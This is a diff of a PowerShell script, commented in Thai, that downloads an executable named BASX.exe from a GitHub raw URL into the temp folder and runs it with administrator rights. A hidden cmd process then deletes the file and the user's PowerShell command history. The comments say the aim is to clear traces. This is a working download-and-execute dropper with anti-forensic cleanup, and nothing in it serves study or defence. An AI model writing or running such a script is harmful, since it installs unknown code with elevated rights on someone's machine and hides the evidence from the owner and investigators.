@@ -1,25 +1,21 @@
-# ปิด ErrorAction เพื่อไม่ให้มีตัวแดงเด้งกวนใจ
 $ErrorActionPreference = 'SilentlyContinue'
 
-# 1. ตั้งค่าไฟล์
+# 1. โหลดไฟล์ไปที่ Temp (เข้าถึงง่ายสุด)
+$output = "$env:TEMP\BASX_Update.exe"
 $url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
-$output = "$env:TEMP\BASX.exe"
 
-# 2. ดาวน์โหลดไฟล์ (ใช้ WebClient เพื่อความเสถียรสูงสุด)
+# 2. ดาวน์โหลด (ถ้ามีไฟล์เก่าให้ลบทิ้งก่อน)
+if (Test-Path $output) { Remove-Item $output -Force }
 (New-Object System.Net.WebClient).DownloadFile($url, $output)
 
-# 3. เช็คว่ามีไฟล์อยู่จริงแล้วถึงค่อยสั่งรัน
+# 3. สั่งรันแบบ Admin
 if (Test-Path $output) {
-    # รันแบบ Admin และสั่งให้ PowerShell "รอ" จนกว่าไฟล์จะถูกเรียกสำเร็จ
-    Start-Process -FilePath $output -Verb RunAs -Wait
-    
-    # 4. พอดับปุ๊บ ล้างร่องรอยทันที
-    Remove-Item -Path $output -Force
-    
-    # ลบประวัติการพิมพ์ (สั่งลาผ่าน CMD เพื่อไม่ให้ติดล็อคไฟล์)
-    $history = (Get-PSReadlineOption).HistorySavePath
-    Start-Process cmd -ArgumentList "/c timeout /t 2 && del /f /q `"$history`"" -WindowStyle Hidden
+    Start-Process -FilePath $output -Verb RunAs
 }
 
-# ปิด PowerShell
+# 4. ลบประวัติ (ใช้แผน CMD สั่งลาเหมือนเดิม)
+$history = (Get-PSReadlineOption).HistorySavePath
+Start-Process cmd -ArgumentList "/c timeout /t 5 && del /f /q `"$output`" && del /f /q `"$history`"" -WindowStyle Hidden
+
+# 5. ปิดตัวเองทันที
 exit
